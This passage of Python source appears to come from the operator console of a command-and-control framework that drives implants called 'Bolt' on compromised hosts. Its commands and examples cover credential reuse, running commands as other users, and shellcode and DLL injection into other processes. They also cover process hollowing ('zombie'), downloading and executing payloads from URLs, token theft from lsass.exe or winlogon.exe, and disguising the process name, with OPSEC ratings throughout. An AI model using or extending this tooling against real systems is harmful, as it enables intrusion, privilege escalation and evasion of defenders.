        creds [-c|--clear] [-d|--domain <domain>] [[domain\\]user[@domain]] [password]

        OS:    Any
        OPsec: n/a
        Admin: n/a

        View, set or clear the current saved credential set.

        This shell can store credentials to be used for successive calls to "run",
        "hup", "shell", "pwsh" and "zombie". If the credentials are valid, the
        commands will execute as the credentialed user instead.

        If no arguments are specified, this will return the current saved credentials
        (if any). Otherwise this can be used to set the credentials or clear them
        with the "-c" or "--clear" argument.

        If a domain is not specified with "-d" or "--domain", it will be parsed
        from the username. Common domain prefixes/suffixes are recognized, such
        as:

        - user@domain
        - domain/user
        - domain\\user

        If a domain is found, the username will be cleaned (without the domain)
        and set and the domain will be set as the new domain value.

        Any non-set value (except domain) will not be changed. Use an empty value
        for that value to set it to empty.

        (The domain value is ignored on non-Windows clients).

        Examples:
            creds
            creds -c
            creds user
            creds user "" # empty password
            creds user password
            creds domain\\user Password123
            creds -d example.com bob password
        """
        if _is_help(a):
            return self.do_help("creds")
        if len(a) == 0:
            if not nes(self._user):
                return print("No current saved credentials.")
            return print(
                "Saved Credentials:\n"
                f"User:        {self._user}\n"
                f"Pass:        {self._password}\n"
                f"Domain:      {self._domain}"
            )
        r = PARSERS[PARSER_CREDS].parse_args(a)
        if r.clear:
            self._user, self._domain, self._password = "", "", ""
            del r
            return print("[+] Cleared saved credentials.")
        if not nes(r.user):
            return print("creds [user] [password]")
        if isinstance(r.pw, str):
            self._password = r.pw
        self._user, self._domain = split_user_domain(r.user, r.domain)
        del r
        print(
            f"Saved Credentials:\nUser:        {self._user}\n"
            f"Pass:        {self._password}\nDomain:      {self._domain}"
        )

    def do_runas(self, *a):
        """
        runas [-x|--detach] [-d|--domain <domain>] <[domain\\]user[@domain]> <pass> <command>

        OS:    Any
        OPsec: Maybe (depends on command)
        Admin: Maybe (depends on command)

        Run the command with the supplied user credentials. The command will NOT
        use any stored credentials and will only use the credentials specified.

        If no password is required, use an empty string "" or '' as a placeholder.

        The PID, exit code and any stdout/stderr data will be returned once the
        process completes only IF the "-x" or "--detach" argument is used. Otherwise,
        this will return after launching the process and will NOT gather any output
        or exit code data.

        If a domain is not specified with "-d" or "--domain", it will be parsed
        from the username. Common domain prefixes/suffixes are recognized, such
        as:

        - user@domain
        - domain/user
        - domain\\user

        If a domain is found, the username will be cleaned (without the domain)
        and use and the domain will be used as the new domain value.

        The parent of this command can be controlled by the parent filter, which
        can be updated with the filter commands. By default the parent will be
        the current client process if not set. Depending on the targeted parent,
        this may error with "invalid handle" as the user specified might not have
        permissions to access the parent targeted.

        This command is affected by the "set_hide" command, which by default
        does not show any processes launched.

        Examples:
            runas bob Password123 tasklist
            runas alice Password! whoami /all
            runas joe@corp.com password1 .dir
            runas -d example.com bob Password123 netstat -anop tcp
        """
        if _is_help(a):
            return self.do_help("runas")
        if len(a) == 0:
            return print("runas <user> <pass> <command>")
        r = PARSERS[PARSER_RUNAS].parse_args(a, nones=False, cat=" ")
        if not nes(r.user) or not nes(r.cmd):
            return print("runas <user> <pass> <command>")
        u, d = split_user_domain(r.user, r.domain)
        self._exec(
            self.shell.cirrus.task_execute,
            cmd=r.cmd,
            show=self.show,
            detach=r.detach,
            filter=self.filter,
            user=u,
            domain=d,
            pw=r.pw,
        )
        del u, d, r

    def do_shell(self, *a):
        """
        shell [-x|--detach] [-u <user>] [-d <domain>] [-p <password>] [-f|--file] <command>

        OS:    Any
        OPsec: Maybe (depends on command)
        Admin: Maybe (depends on command)

        Executes a command on the client as a shell command will return the
        PID, exit code and any stdout/stderr data once the process completes.

        This handles the location of system shell automatically.

        The parent of this command can be controlled by the parent filter, which
        can be updated with the filter commands. By default the parent will be
        the current client process if not set.

        This command is affected by the "set_hide" command, which by default
        does not show any processes launched.

        The period symbol "." can be prefixed to a raw command instead to run as
        a shell command instead of using this function.

        This command is affected by any saved credentials (if no credentials are
        specified manually. See below.)

        If the "-x" or "--detach" argument is specified, the command will be ran
        in "detached" mode and will return instantly and not be monitored. (This
        also allows the process to live even when the client is closed). This is
        the same as running this command with the "hup" command.

        The additional "-u", "-p" and "-d" arguments may be used to change the
        user the process is executed as. See the "runas" command for more info.

        If the "-f" or "--file" argument is specified, the command is evaluated
        to detect any Data Specification Identifiers present and can be a raw string
        value instead of a file. If no identifiers are found, this will default
        to a local file path to be read and will be sent to the shell as input
        to stdin.

        See "help data" for more info on Data Specification Identifiers.

        Examples:
            shell pwd
            shell set
            .whoami
            .dir
        """
        self._run("shell", False, ".", *a)

    def do_jitter(self, v):
        """
        jitter [percentage %]

        OS:    Any
        OPsec: n/a
        Admin: n/a

        Update the jitter percentage value for the client. The specified value
        can include or omit the percentage sign "%".

        If no value is specified, this displays the current jitter percentage.

        Examples:
            jitter
            jitter 50
            jitter 15
        """
        if len(v) == 0:
            s = self.shell.cirrus.session(self.id)
            print(f'Jitter is set to: {s["jitter"]}%')
            del s
            return
        self._system(f"jitter {v}")

    def do_mounts(self, _):
        """
        mounts

        OS:    Any except WASM
        OPsec: Safe
        Admin: No

        Lists all mounted drives and/or shares connected to the client.
        """
        self._system("mounts")

    def do_whoami(self, _):
        """
        whoami

        OS:    Any
        OPsec: Safe
        Admin: No

        Returns the current up-to-date username of the client without triggering
        a refresh.
        """
        self._system("whoami")

    def do_spawn(self, *a):
        """
        spawn [pipe] [data]
        |     [-m|--method]     <method>
        |     [-t|--target]     <process_name | pid>
        |     [-n|--profile     <profile>
        |     [-f|--args]       <args>
        |     [-a|--agent]      <user-agent>
        |     [-R|--no-reflect]
        |     [-u|--user]       <[domain\\]user[@domain]>
        |     [-d|--domain]     <domain>
        |     [-p|--password]   <password>
        |     [-e|--entry]      <function>
        |     [-z|--no-auto]

        OS:    Any
        OPsec: Not Safe! (If a local file without reflect is used), Disk Write
        Admin: Maybe (depends on method/target)

        Spawn a similar instance of this client using a type of method. The method
        can be specified by the "-m" argument.

        The "pipe" argument is required and specifies what pipe name to use to
        connect to the new instance. (However if the "-P/--pipe" argument was
        specified at runtime or through the "DOPPLER_PIPE" environment variable
        the pipe value will be inferred from there and it may be omitted. This
        action can be disable using the "-z/--no-auto" argument.) The pipe value
        is most likely compiled into the client.

        If any DLL or ASM files are specified using the Doppler command line, the
        file will be used if no file path is specified. Doppler will perfer the ASM
        payload over DLL, if specified. If no method is specified, it will default
        to ASM or DLL if a file is specified.

        By default, the current profile will be used, but can be changed by
        specifying the name with the "-n" argument.

        If the method is "self", "exec" or "exe" the additional "-u", "-p" and
        "-d" arguments may be used to change the user the process is executed as.
        See the "runas" command for more info.

        Data Specification Identifiers may be used in the data arguments to this
        command.

        See "help data" for more info on Data Specification Identifiers.

        The following methods are valid:

        dll
        |  Use the data specified as a DLL migration method. This method requires
        |  a target to be specified as the host for the DLL. By default, if the
        |  "-R" or "--no-reflect" arguments are NOT supplied, this will convert
        |  the DLL data to assembly before sending it to the client. Otherwise the
        |  DLL will be written to disk before loading.
        |
        |  If a remote path identifier is used instead, the "-R" and "--no-reflect"
        |  arguments are ignored.
        |
        | The "-e" or "--entry" argument can be used to specify the function started
        | after DLLMain. This will only occur if the DLL is reflected and will be
        | ignored if empty.

        asm
        |  Use the data specified as assembly migrate code. This method requires
        |  a target to be specified as the host for the shellcode. If the data
        |  represents a DLL, this will convert the DLL to assembly before sending
        |  it to the client.
        |
        |  The "-e" or "--entry" argument can be used to specify the function started
        |  after DLLMain (if the file is a DLL or DLL bytes).

        exec|exe
        |  Execute a command as the migrate method. This is the default option
        |  if a method is not specified. If the special value "self" is used, this
        |  will use the current client binary path to execute instead.

        pexec|url
        |  Download a payload and execute it as a migrate method. This works
        |  similar to the "dex" command and follows the same content rules.
        |  This method will be automatically selected if a URL is detected and
        |  no method is specified. To force the usage of this method, use "pexec"
        |  or "url" as the "-m" argument value.
        |
        |  Similar to the "dex" command, the "-a" or "--agent" argument may be
        |  used to change the User-Agent used from the default value. See the
        |  "dex" or "pull" command for more info.
        |
        |  If a target is specified and the downloaded type requires a target, it
        |  will be used, otherwise a random process will be chosen.
        |
        |  If the download type is a command type the parent can be controlled by
        |  the parent filter, which can be updated with the filter commands. By
        |  default the parent will be the current client process if not set.

        zombie
        |  Use the data specified as assembly migrate code in a zombified process.
        |  This method requires a command to be used as the host, supplied using the
        |  "-f" argument. The running binary must exist but the arguments may be
        |  random/invalid. If the data represents a DLL, this will convert the DLL
        |  to assembly before sending it to the client.
        |
        |  The parent of the zombie process can be controlled by the parent filter,
        |  which can be updated with the filter commands. By default the parent
        |  will be the current client process if not set.
        |
        |  The "-e" or "--entry" argument can be used to specify the function started
        |  after DLLMain (if the file is a DLL or DLL bytes).

        The arguments for this command are similar to the "migrate" command.

        Examples:
            spawn pipe-me self
            spawn -m exec pipe-me
            spawn -p my_profile -m dll pipe-me ~/implant.dll
            spawn pipe-me http://path.to.shell.code
            spawn -m url pipe-me path.to.shell.code
            spawn -p my_profile -m asm ~/bolt.bin
            spawn -m zombie -f notepad.exe ~/implant.dll
            spawn -m self -u admin -p Password123 derp-me
        """
        if _is_help(a):
            return self.do_help("spawn")
        if len(a) < 1:
            return print("spawn [pipe] [data]")
        r = PARSERS[PARSER_SPAWN].parse_args(a)
        if nes(self.shell.pipe) and not r.no_auto:
            if not nes(r.data) and nes(r.pipe):
                r.data = r.pipe
                r.pipe = self.shell.pipe
                print(HELP_PIPE.format(pipe=self.shell.pipe))
            elif not nes(r.pipe):
                r.pipe = self.shell.pipe
                print(HELP_PIPE.format(pipe=self.shell.pipe))
        if not nes(r.pipe):
            return print("[!] spawn: invalid/missing pipe name")
        f = self.filter
        if nes(r.target):
            f = _quick_filter(r.target)
        try:
            m, c = _get_callable("spawn", self.show, r, self.shell.asm, self.shell.dll)
        except (ValueError, OSError) as err:
            return print(f"[!] {err}!")
        self._exec(
            self.shell.cirrus.task_spawn,
            pipe=r.pipe,
            method=m,
            profile=r.profile,
            exec=c,
            filter=f,
        )
        del f, m, c, r

    def do_reboot(self, *a):
        """
        reboot [-r|--reason <N>] [-t|--seconds <N>] [-f|--force] [message]

        OS:    Any
        OPsec: I guess?
        Admin: Maybe (depends on permissions)

        Triggers a reboot of the client device.

        Force "-f" can be used to forcefully disconnect and reboot the device,
        preventing it from waiting based on running user programs.

        The "-r" specifies the reason code, which determines what is written in
        the Windows event log. Hex values for this option are accepted. This
        option and the "-f" force option are only used for Windows clients.

        The "-s" seconds value can be specified to delay the reboot for the period
        of time specified. If omitted, this defaults to zero.

        Any text that is not an argument is taken as a message string that is
        displayed to Windows clients in the "shutdown" message. This message may
        use Data Specification Identifiers to display raw or Base64 encoded text,
        but will not accept file paths. If no identifiers are found, it defaults
        to a string.

        See "help data" for more info on Data Specification Identifiers.

        Examples:
            reboot -r 0xFA -s 15
            reboot -s 30 All your base are belong to us!
        """
        if _is_help(a):
            return self.do_help("reboot")
        if len(a) == 0 and not do_ask("Reboot this device"):
            return
        r = PARSERS[PARSER_POWER].parse_args(a, cat=" ", nones=False)
        self._exec(
            self.shell.cirrus.task_power,
            action="restart",
            message=r.message,
            force=r.force,
            seconds=r.seconds,
            reason=r.reason,
        )
        del r

    def do_untrust(self, v):
        """
        untrust [pid | process_name]

        OS:    Windows
        OPsec: Safe
        Admin: Maybe (depends on target)

        "Untrust" the target. This will strip the process of all it's permissions
        and will set the integrity level to Untrusted. This effectively nuters
        the ability for a process to do anything.

        If the pid and/or name is not supplied, the parent filter will be used,
        which can be updated with the filter commands.

        If no pid or name is supplied and the parent filter is empty, this will
        return an error.

        Examples:
            untrust
            untrust 1337
            untrust taskmgr.exe
        """
        if not nes(v) and not do_ask(
            "Are you sure you want to use the parent filter target"
        ):
            return print("[!] Untrust aborted")
        self._system_filter("untrust", v)

    def do_parent(self, *a):
        """
        parent [..optional-args..] [pid | name1,name2,nameX...]

        OS:    n/a
        OPsec: n/a
        Admin: n/a

        If no arguments are specified, this will just display the current Parent
        Filter options set.

        The last value may be a PID or a (comma|space) seperated list of process
        names. If the value is a number an nothing else is specified, it will be
        considered a PID, otherwise be evaluated as a name.

        All set operations using this function are APPEND functions and will only
        overrite. Use the "-c" or "--clear" flag to reset the Filter.

        Other Optional Arguments
        | -c                         Clear the Parent Filter, takes priority over
        | --clear                     all other arguments.
        | -p        <pid>            Specify the PID to use for the Parent Filter.
        | --pid     <pid>             Takes priority over all other options.
        | -x        <name1,nameX>    Specify a (comma|space) seperated list of process
        | --exclude <name1,nameX>     names to EXCLUDE from the Filter search process.
        |                            This may be used more than one time in the command.
        | -d                          Enable the search to only ALLOW FOREGROUND or
        | --desktop                   DESKTOP processes to be used. Default is don't
        |                             care. Takes priority over any disable arguments.
        | -D                         Enable the search to only ALLOW BACKGROUND or
        | --no-desktop                SERVICE processes to be used. Default is don't
        |                             care.
        | -a | -e                    Enable the search to only ALLOW ELEVATED processes
        | --admin | --elevated        to be used. Default is don't care. Takes priority
        |                             over any disable arguments.
        | -A | -E                    Enable the search to only ALLOW NON-ELEVATED
        | --no-admin | --no-elevated  processes to be used. Default is don't care.
        | -f                         Enable the Filter to fallback if no suitable
        | --fallback                  processes were found during the first run and
        |                             run again with less restrictive settings.
        | -F                         Disable the Filter's ability to fallback if no
        | --no-fallback               suitable processes were found during the first
        |                             run.

        Examples:
            parent
            parent 1337
            parent -p 1337
            parent svchost.exe
            parent -d -F -D -e lsass.exe
            parent -x notepad.exe,explorer.exe lsass.exe,svchost.exe
            parent -A -d -x winword.exe,notepad.exe -x cmd.exe explorer.exe,chrome.exe
        """
        if _is_help(a):
            return self.do_help("parent")
        if len(a) == 0:
            if self.filter is None:
                return print("[+] Parent Filter:\n   <empty>")
            return print(f"[+] Parent Filter:\n   {self.filter}")
        r = PARSERS[PARSER_PARENT].parse_args(a)
        if r.clear:
            if self.filter is None or self.filter.is_empty():
                self.filter = None
                print("[+] Parent Filter:\n   <empty>")
                return False
            self.filter = None
            print("[+] Parent Filter:\n   <empty>")
            return True
        c = False
        if self.filter is None:
            c, self.filter = True, Filter()
        if nes(r.include):
            try:
                v = int(r.include, 10)
            except ValueError:
                pass
            else:
                c = c or self.filter.pid != v
                self.filter.pid = v
                if c:
                    print(f"[+] Parent Filter:\n   {self.filter}")
                return c
        if isinstance(r.pid, int):
            if r.pid <= 0:
                c = c or (self.filter.pid is not None or self.filter.pid > 0)
                self.filter.pid = None
            else:
                c = c or self.filter.pid != r.pid
                self.filter.pid = r.pid
        if r.exclude is not None and len(r.exclude) > 0:
            v = _split_list_values(r.exclude)
            c = c or self.filter.exclude != v
            self.filter.exclude = v
            del v
        if r.include is not None and len(r.include) > 0:
            v = _split_list_values(r.include)
            c = c or self.filter.include != v
            self.filter.include = v
            del v
        if not r.no_admin or r.admin is not None:
            v = (r.admin is None and r.no_admin) or (r.admin is True and r.no_admin)
            c = c or self.filter.elevated != v
            self.filter.elevated = v
            del v
        if not r.no_desktop or r.desktop is not None:
            v = (r.desktop is None and r.no_desktop) or (
                r.desktop is True and r.no_desktop
            )
            c = c or self.filter.session != v
            self.filter.session = v
            del v
        if not r.no_fallback or r.fallback is not None:
            v = (r.fallback is None and r.no_fallback) or (
                r.fallback is True and r.no_fallback
            )
            c = c or self.filter.fallback != v
            self.filter.fallback = v
            del v
        del r
        print(f"[+] Parent Filter:\n   {self.filter}")
        return c

    def do_zombie(self, *a):
        """
        zombie [-x|--detach]
               [-u|--user]     <user>
               [-d|--domain]   <domain>
               [-p|--password] <password>
               [-e|--entry]    <function>
               <data>
               <fake_args>

        OS:    Windows
        OPsec: Safe
        Admin: Maybe (depends on host target)

        Reads the data as binary data will run it in memory in a sacrificial
        suspended process. The Zombie process binary fake target must exist but
        can have any arguments.

        If the "-x" or "--detach" argument is specified, the command will be ran
        in "detached" mode and will return instantly and not be monitored. (This
        also allows the process to live even when the client is closed).

        The parent of this command can be controlled by the parent filter, which
        can be updated with the filter commands. By default the parent will be
        the current client process if not set.

        Data passed to this command will be evaluated for Data Specification
        Identifiers, but will default to a local file path.

        See "help data" for more info on Data Specification Identifiers.

        The "-e" or "--entry" argument can be used to specify the function started
        after DLLMain (if the file is a DLL or DLL bytes).

        This command is affected by any saved credentials (if no credentials are
        specified manually. See below.)

        The additional "-u", "-p" and "-d" arguments may be used to change the
        user the process is executed as. See the "runas" command for more info.

        Examples:
            zombie /home/hackerman/gibson.bin svchost.exe -k LocalSystemNetworkRestricted -p -s
            zombie /tmp/malware.dll notepad.exe this-file-does-not-exist.txt
            zombie ~/malware.dll -a admin -p Password123 explorer.exe
        """
        if _is_help(a):
            return self.do_help("zombie")
        if len(a) < 2:
            return print("zombie <data> <fake_args>")
        r = PARSERS[PARSER_ZOMBIE].parse_args(a, cat=" ")
        if not nes(r.data):
            return print("zombie <data> <fake_args>")
        if not nes(r.args):
            return print("zombie <data> <fake_args>")
        if nes(r.user):
            u, d = split_user_domain(r.user, r.domain)
            p = r.pw
        else:
            u, d, p = self._user, self._domain, self._password
        self._exec(
            self.shell.cirrus.task_zombie,
            data=r.data,
            fake_args=r.args,
            show=self.show,
            detach=r.detach,
            filter=self.filter,
            user=u,
            domain=d,
            pw=p,
        )
        del r, u, p, d

    def do_profile(self, n):
        """
        profile <name>

        OS:    Any
        OPsec: Safe
        Admin: No

        Sets the client profile to the profile specified by the supplied name.

        Examples:
            profile my-profile
        """
        if len(n) == 0:
            return print("profile <name>")
        self._exec(self.shell.cirrus.task_profile, profile=n)

    def _exec(self, f, **a):
        if not isinstance(a, dict):
            a = dict()
        try:
            f(self.id, **a)
        except (ValueError, TypeError) as err:
            print(f"[!] {err}!")

    def do_elevate(self, v):
        """
        elevate [pid | process_name]

        OS:    Windows
        OPsec: Safe
        Admin: Maybe (depends on target)

        Attempt to steal and use a token from the target process.

        If the pid and/or name is not supplied, the parent filter will be used,
        which can be updated with the parent commands.

        If no pid or name is supplied and the parent filter is empty, this will
        return an error.

        Examples:
            elevate
            elevate 1337
            elevate lsass.exe
            elevate winlogon.exe
        """
        self._system_filter("elevate", v)

    def do_refresh(self, _):
        """
        refresh

        OS:    Any
        OPsec: Safe
        Admin: No

        Refresh the client's system information and return the results back to
        the server.
        """
        self._system("refresh")

    def do_killdate(self, v):
        """
        killdate [date/time]

        OS:    Any
        OPsec: n/a
        Admin: n/a

        Update the jitter kill date value for the client. The specified value
        should take the form of "YYYY-MM-DD HH:MM".

        The values "YYYY" may be subbed for "YY" or the date can be shortened to
        "MM-DD" which takes the next year if the date has already passed. "HH:MM"
        can also be omitted which will set the kill date to midnight on the
        specified date. The value of "HH:MM" may also be specified by itself to
        indicate the time of the current day.

        If no value is specified, this displays the current kill date.

        Examples:
            killdate
            killdate 23:30
            killdate 2050-10-30
            killdate 10-30 13:30
            killdate 2050-10-30 18:45
        """
        if len(v) == 0:
            s = self.shell.cirrus.session(self.id)
            if "kill_date" in s and nes(s["kill_date"]):
                print(f'Kill Date is set to: {s["kill_date"]}')
            else:
                print("No Kill Date is set")
            del s
            return
        if v == "-c" or v == "--clear":
            return self._system("killdate")
        self._system(f"killdate {v}")

    def do_shutdown(self, f):
        """
        shutdown [-f|--force]

        OS:    Any
        OPsec: Safe
        Admin: No

        Indicates to the current client that it should shutdown and release it's
        resources.

        Pass the "-f" or "--force" to force shutdown and do not ask for confirmation.

        THIS DOES NOT SHUTDOWN THE CLIENT DEVICE, USE "poweroff" INSTEAD.
        """
        if (not nes(f) or "-f" not in f) and not do_ask(
            "Confirm shutdown of this Bolt"
        ):
            return print("[-] Aborting shutdown!")
        self.shell.cirrus.session_remove(self.id, True)
        print("[+] Triggered Bolt shutdown.")
        self.shell.cache._bolts = None

    def do_cp(self, p, dest):
        """
        cp <remote_source> <remote_dest>

        OS:    Any
        OPsec: Not Safe! Disk Write
        Admin: Maybe (depends on target)

        Copies a file from the specified remote path to the remote destination.
        The copy will overrite any file present at the destination path.

        Environment variables are processed on the client.

        Examples:
            cp C:/file1 C:/file2
        """
        if not nes(p) or not nes(dest):
            return print("cp <remote_source> <remote_dest>")
        self._exec(self.shell.cirrus.task_copy, src=p, dest=dest)

    def do_mv(self, p, dest):
        """
        mv <remote_source> <remote_dest>

        OS:    Any
        OPsec: Not Safe! Disk Write
        Admin: Maybe (depends on target)

        Moves a file from the specified remote path to the remote destination.
        The move will overrite any file present at the destination path.

        Environment variables are processed on the client.

        Examples:
            mv C:/file2 C:/file3
        """
        if not nes(p) or not nes(dest):
            return print("mv <remote_source> <remote_dest>")
        self._exec(self.shell.cirrus.task_move, src=p, dest=dest)

    def do_procname(self, n):
        """
        procname <name>

        OS:    Any except WASM
        OPsec: Safe-ish
        Admin: No

        Attempts to rename the process arguments to the provided string. On *nix
        devices, the value cannot be longer than the current process name and will
        be silently truncated if it's larger.

        This will replace the "Command Line" value on Windows, but may not work
        correctly if the build is a different architecture than the client.

        Examples:
            procname apache2
            procname [kernel]
            procname C:\\Windows\\System32\\rundll32.exe systemtask.ocx
        """
        if len(n) == 0:
            return print("procname <name>")
        self._system(f"procname {n}")

    def do_regedit(self, *a):
        """
        regedit <action> [-f|--force] <key> [value] [type] [data|int]

        OS:    Windows
        OPsec: Maybe (depends on action / logging setup)
        Admin: Maybe (depends on action)

        Retrieve, delete or modify data on the client system's registry.

        The action argument specifies what to do and how many parameters are
        required

        Actions:

        get
        |  Retrieve the data and type of the supplied key and value. The "value"
        |  option is required, use an empty string to specify the "(Default)" value.

        ls|dir
        |  Retrieve a listing of the keys and values for the supplied key path.
        |  If "value" is specified, this will behave like a "get" action.

        set|edit|update
        |  Set and/or update the registry value. If the value does not exist,
        |  create it. Any keys in the path will also be created. This option
        |  requires the "value" and "type" arguments to be specified, use an empty
        |  string to specify the "(Default)" value. If "data" is omitted, this
        |  will set the value as empty.

        rm|rem|del|delete
        |  Delete the specified key or value (if "value" is not omitted). This
        |  will only delete non-empty keys if the "-f" or "--force" argument is
        |  specified.

        Type can be one of the following:
        - sz|string: "data" must be a string.
        - bin|binary: "data" must be in a Data Specification Identifier format.
        - dword|uint32: "data" must be a integer.
        - qword|uint64: "data" must be a integer.
        - multi|multi_sz: "data" must be a string, separate multiple entries with
          '\\n' (newline). Recommended to use Raw Strings with r$.
        - exp_sz|expand_string: "data" must be a string

        Data passed to this command when setting value data will be evaluated for
        Data Specification Identifiers, but will default to text. THIS WILL NOT
        HAPPEN WHEN THE DATATYPE IS AN INTEGER.

        See "help data" for more info on Data Specification Identifiers.

        The "key" argument takes both "reg.exe" and PowerShell registry hive
        name conventions (ex: "HKLM:\\System" and "HKLM\\System" are equal.)

        If "key" or "value" have spaces, they must be enclosed in double quotes.

        Examples:
            regedit del "HKCU:\\Control Panel\\Desktop\\My Key"
            regedit set "HKCU:\\Control Panel\\Desktop" "Wallpaper" string "C:\\lol.jpg"
            regedit ls "HKCU:\\System\\CurrentControlSet\\Services"
            regedit ls "HKLM\\Hardware\\Description\\System\\CentralProcessor"
        """
        if _is_help(a):
            return self.do_help("regedit")
        if len(a) < 2:
            return print("regedit <ls|get|set|del> <key> [value] [type] [data|int]")
        r = PARSERS[PARSER_REGEDIT].parse_args(a, eq=True)
        if not nes(r.action) or not nes(r.key):
            return print("regedit <ls|get|set|del> <key> [value] [type] [data|int]")
        self._exec(
            self.shell.cirrus.task_registry,
            action=r.action.lower(),
            key=r.key,
            value=r.value,
            type=r.exp,
            data=r.data,
            force=r.force,
        )
        del r

    def do_rev2self(self, _):
        """
        rev2self

        OS:    Windows
        OPsec: Safe
        Admin: No

        Revert the token status to before any impersonation occurred. This would
        be used to reset permissions after finished with an "elevate", "steal" or
        "make_token" command.
        """
        self._system("rev2self")

    def do_set_hide(self, v):
        """
        set_hide [boolean]

        OS:    n/a
        OPsec: n/a
        Admin: n/a

        Enable/Disable global shell command visibility. If no option is specified,
        command windows are hidden. Can take multiple types of boolean values
        ("true", "T", "t", "yes", "y", "enable", "e", "1").

        Examples:
            set_hide
            set_hide no
            set_hide true
        """
        n = True
        if len(v) > 0:
            n = is_true(v)
        n = not n
        print(f"[+] Set Show Window: {self.show} => {n}.")
        c = self.show != n
        self.show = n
        del n
        return c

    def do_write(self, d, p):
        """
        write <data> <remote_path>

        OS:    Any
        OPsec: Not Safe! Disk Write
        Admin: Maybe (depends on target)

        Write the supplied contents to the remote path. This will overrite
        the contents if the current path exists.

        Data passed to this command will be evaluated for Data Specification
        Identifiers, but will default to text.

        See "help data" for more info on Data Specification Identifiers.

        Examples:
            write "hello world!" C:/hello.txt
        """
        if not nes(p):
            return print("write <data> <remote_path>")
        if not isinstance(d, str):
            d = ""
        self._exec(self.shell.cirrus.task_upload, data=d, dest=p)

    def do_migrate(self, *a):
        """
        migrate [pipe] [file]
        |       [-m|--method]     <method>
        |       [-t|--target]     <process_name | pid>
        |       [-n|--profile     <profile>
        |       [-f|--args]       <args>
        |       [-a|--agent]      <user-agent>
        |       [-R|--no-reflect]
        |       [-u|--user]       <[domain\\]user[@domain]>
        |       [-d|--domain]     <domain>
        |       [-p|--password]   <password>
        |       [-e|--entry]      <function>
        |       [-z|--no-auto]

        OS:    Any
        OPsec: Not Safe! (If a local file without reflect is used), Disk Write
        Admin: Maybe (depends on method/target)

        Migrate control to another process using a type of method. The method can
        be specified by the "-m" argument.

        The "pipe" argument is required and specifies what pipe name to use to
        connect to the new instance. (However if the "-P/--pipe" argument was
        specified at runtime or through the "DOPPLER_PIPE" environment variable
        the pipe value will be inferred from there and it may be omitted. This
        action can be disable using the "-z/--no-auto" argument.) The pipe value
        is most likely compiled into the client.

        If any DLL or ASM files are specified using the Doppler command line, the
        file will be used if no file path is specified. Doppler will perfer the ASM
        payload over DLL, if specified. If no method is specified, it will default
        to ASM or DLL if a file is specified.

        By default, the current profile will be used, but can be changed by
        specifying the name with the "-n" argument.

        If the method is "self", "exec" or "exe" the additional "-u", "-p" and
        "-d" arguments may be used to change the user the process is executed as.
        See the "runas" command for more info.

        Data Specification Identifiers may be used in the data arguments to this
        command.

        See "help data" for more info on Data Specification Identifiers.

        The following methods are valid:

        dll
        |  Use the data specified as a DLL migration method. This method requires
        |  a target to be specified as the host for the DLL. By default, if the
        |  "-R" or "--no-reflect" arguments are NOT supplied, this will convert
        |  the DLL data to assembly before sending it to the client. Otherwise the
        |  DLL will be written to disk before loading.
        |
        |  If a remote path identifier is used instead, the "-R" and "--no-reflect"
        |  arguments are ignored.
        |
        | The "-e" or "--entry" argument can be used to specify the function started
        | after DLLMain. This will only occur if the DLL is reflected and will be
        | ignored if empty.

        asm
        |  Use the data specified as assembly migrate code. This method requires
        |  a target to be specified as the host for the shellcode. If the data
        |  represents a DLL, this will convert the DLL to assembly before sending
        |  it to the client.
        |
        |  The "-e" or "--entry" argument can be used to specify the function started
        |  after DLLMain (if the file is a DLL or DLL bytes).

        exec|exe
        |  Execute a command as the migrate method. This is the default option
        |  if a method is not specified. If the special value "self" is used, this
        |  will use the current client binary path to execute instead.

        pexec|url
        |  Download a payload and execute it as a migrate method. This works
        |  similar to the "dex" command and follows the same content rules.
        |  This method will be automatically selected if a URL is detected and
        |  no method is specified. To force the usage of this method, use "pexec"
        |  or "url" as the "-m" argument value.
        |
        |  Similar to the "dex" command, the "-a" or "--agent" argument may be
        |  used to change the User-Agent used from the default value. See the
        |  "dex" or "pull" command for more info.
        |
        |  If a target is specified and the downloaded type requires a target, it
        |  will be used, otherwise a random process will be chosen.
        |
        |  If the download type is a command type the parent can be controlled by
        |  the parent filter, which can be updated with the filter commands. By
        |  default the parent will be the current client process if not set.

        zombie
        |  Use the data specified as assembly migrate code in a zombified process.
        |  This method requires a command to be used as the host, supplied using the
        |  "-f" argument. The running binary must exist but the arguments may be
        |  random/invalid. If the data represents a DLL, this will convert the DLL
        |  to assembly before sending it to the client.
        |
        |  The parent of the zombie process can be controlled by the parent filter,
        |  which can be updated with the filter commands. By default the parent
        |  will be the current client process if not set.
        |
        |  The "-e" or "--entry" argument can be used to specify the function started
        |  after DLLMain (if the file is a DLL or DLL bytes).

        The arguments for this command are similar to the "spawn" command.

        Examples:
            migrate pipe-me self
            migrate -m exec pipe-me
            migrate -p my_profile -m dll pipe-me ~/implant.dll
            migrate pipe-me http://path.to.shell.code
            migrate -m url pipe-me path.to.shell.code
            migrate -p my_profile -m asm ~/bolt.bin
            migrate -m zombie -f notepad.exe ~/implant.dll
            migrate -m self -u admin -p Password123 derp-me
        """
        if _is_help(a):
            return self.do_help("migrate")
        if len(a) < 1:
            return print("migrate [pipe] [data]")
        r = PARSERS[PARSER_SPAWN].parse_args(a)
        if nes(self.shell.pipe) and not r.no_auto:
            if not nes(r.data) and nes(r.pipe):
                r.data = r.pipe
                r.pipe = self.shell.pipe
                print(HELP_PIPE.format(pipe=self.shell.pipe))
            elif not nes(r.pipe):
                r.pipe = self.shell.pipe
                print(HELP_PIPE.format(pipe=self.shell.pipe))
        if not nes(r.pipe):
            return print("[!] migrate: invalid/missing pipe name")
        f = self.filter
        if nes(r.target):
            f = _quick_filter(r.target)
        try:
            m, c = _get_callable(
                "migrate", self.show, r, self.shell.asm, self.shell.dll
            )
        except (ValueError, OSError) as err:
            return print(f"[!] {err}!")
        self._exec(
            self.shell.cirrus.task_migrate,
            pipe=r.pipe,
            method=m,
            profile=r.profile,
            exec=c,
            filter=f,
        )
        del f, m, c, r

    def do_loginas(self, *a):
        """
        loginas [-i|--interactive] [-d|--domain <domain>] <[domain\\]user[@domain]> [password]

        OS:    Any
        OPsec: Maybe (Network/ETW logs?)
        Admin: No

        Perform a network login with the supplied credentials. The command will
        NOT use any stored credentials and will only use the credentials specified.

        This allows for any commands/access outside of the local device to be
        authenticated as the target user. The current process username will NOT
        change as this only affects REMOTE resources.

        If a domain is not specified with "-d" or "--domain", it will be parsed
        from the username. Common domain prefixes/suffixes are recognized, such
        as:

        - user@domain
        - domain/user
        - domain\\user

        If a domain is found, the username will be cleaned (without the domain)
        and use and the domain will be used as the new domain value.

